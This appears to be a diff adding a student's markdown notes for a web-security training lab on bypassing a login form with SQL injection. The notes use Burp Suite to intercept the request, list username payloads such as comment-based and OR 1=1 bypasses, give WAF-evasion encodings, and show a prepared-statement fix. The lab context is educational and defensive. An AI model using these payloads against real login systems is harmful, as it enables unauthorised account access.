@@ -1,0 +1,54 @@
+# SQL injection lab2
+# Objective
+  Bypass authentication using SQL injection to log in as the administrator without a password.
+
+# Burp Suite
+    1.Start Burp Suite and configure your browser proxy
+    2.Access the lab URL to load the login page
+    3.Turn on "Intercept" in Burp Proxy tab
+    4.Enter any credentials (e.g., test:test) and click "Login"
+    5.Burp will capture a POST request like:
+          POST /login HTTP/1.1
+          Host: <lab-id>.web-security-academy.net
+          ...
+          username=test&password=test
+      The backend query likely looks like:
+          SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
+      6.Right-click the request → "Send to Repeater"
+      7.Modify the username parameter to:
+          username=administrator'--&password=anything
+        The resulting query becomes:
+          SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
+            In Burp Repeater, try these variations:
+              Classic bypass:
+                      username=administrator' OR 1=1--&password=anything
+              MySQL variant:
+                      username=administrator'#&password=anything
+              With URL encoding:
+                      username=administrator%27--&password=anything
+            HTTP 302 redirect response
+            "Congratulations" message in response
+            Session cookie in response headers
+
+# Perevention 
+  String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+  String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+  PreparedStatement stmt = connection.prepareStatement(query);
+  stmt.setString(1, username);
+  stmt.setString(2, password);
+
+# Key 
+  Target: Authentication system instead of product filter
+  Technique: Commenting out password check vs. modifying WHERE clause
+  Impact: Gaining admin access vs. viewing hidden data
+
+# Troubleshooting
+If injection fails:
+1. Try different comment syntax (`--`, `#`, `/* */`)
+2. Test URL-encoded versions (%27 for apostrophe)
+3. Verify lab instance is still active
+
+# WAF Bypass Techniques
+1. Alternative whitespace: `username=admin%0A'--`
+2. Double URL encoding: `%2527` for apostrophe
+3. Nested expressions: `admin'+(1)or'1'='1`
